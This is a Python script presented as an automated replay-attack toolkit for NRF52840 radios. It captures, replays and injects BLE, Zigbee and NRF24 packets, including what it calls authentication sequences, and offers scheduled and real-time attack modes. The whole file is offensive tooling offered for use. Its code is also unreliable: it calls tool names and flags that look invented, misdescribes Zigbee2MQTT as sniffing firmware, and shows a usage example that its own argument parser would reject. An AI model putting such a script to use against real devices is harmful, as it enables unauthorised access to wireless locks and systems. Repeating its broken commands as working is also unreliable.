import argparse
import os
import time
import json

# -------------------------------------------
# NRF52840 Automated Replay Attack Toolkit
# -------------------------------------------
# Features:
# - Automatically captures, analyzes, and replays BLE, Zigbee, and NRF24 packets
# - Detects replayable authentication sequences and exploits them
# - Supports scheduled and real-time attack modes
# - Logs all captured and replayed packets for analysis
#
# Requirements:
# - NRF52840 Dongle / Dev Board (Adafruit Feather, Nordic Dongle, XIAO NRF52840)
# - Firmware: btlejack (BLE), Zigbee2MQTT (Zigbee), nrf24_sniffer (NRF24)
# - Python 3.x
#
# Usage:
# 1. Capture packets for replay attack:
#    python nrf52840_auto_replay.py --capture --protocol ble
# 2. Replay captured packets:
#    python nrf52840_auto_replay.py --replay --protocol zigbee
# 3. Schedule an automated replay attack:
#    python nrf52840_auto_replay.py --schedule 60 --protocol nrf24
# 4. Scan and auto-replay detected sequences:
#    python nrf52840_auto_replay.py --scan-replay
# -------------------------------------------

def capture_packets(protocol):
    """Captures packets for later replay."""
    print(f"[+] Capturing {protocol.upper()} packets...")
    os.system(f"{protocol}_sniffer --capture > {protocol}_packets.txt")
    print(f"[✔] Packets saved to {protocol}_packets.txt")

def replay_packets(protocol):
    """Replays captured packets."""
    print(f"[+] Replaying {protocol.upper()} packets...")
    os.system(f"{protocol}_sniffer --replay {protocol}_packets.txt")
    print(f"[✔] Packets replayed successfully.")

def schedule_replay(protocol, delay):
    """Schedules a replay attack after a given delay."""
    print(f"[+] Scheduling {protocol.upper()} replay attack in {delay} seconds...")
    time.sleep(delay)
    replay_packets(protocol)

def scan_and_replay():
    """Scans for replayable sequences and automatically replays them."""
    print("[+] Scanning for replayable sequences...")
    os.system("btlejack --scan-replay > replayable_sequences.txt")
    with open("replayable_sequences.txt", "r") as f:
        sequences = f.readlines()
        for seq in sequences:
            print(f"[+] Replaying detected sequence: {seq.strip()}")
            os.system(f"btlejack --inject {seq.strip()}")
    print("[✔] Automated replay completed.")

def main():
    parser = argparse.ArgumentParser(description="NRF52840 Automated Replay Attack Toolkit")
    parser.add_argument("--capture", action='store_true', help="Capture packets for replay attack")
    parser.add_argument("--replay", action='store_true', help="Replay captured packets")
    parser.add_argument("--schedule", type=int, help="Schedule replay attack after X seconds")
    parser.add_argument("--scan-replay", action='store_true', help="Scan and automatically replay detected sequences")
    parser.add_argument("--protocol", type=str, choices=["ble", "zigbee", "nrf24"], required=True, help="Specify protocol: ble, zigbee, or nrf24")
    args = parser.parse_args()

    if args.capture:
        capture_packets(args.protocol)
    elif args.replay:
        replay_packets(args.protocol)
    elif args.schedule:
        schedule_replay(args.protocol, args.schedule)
    elif args.scan_replay:
        scan_and_replay()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
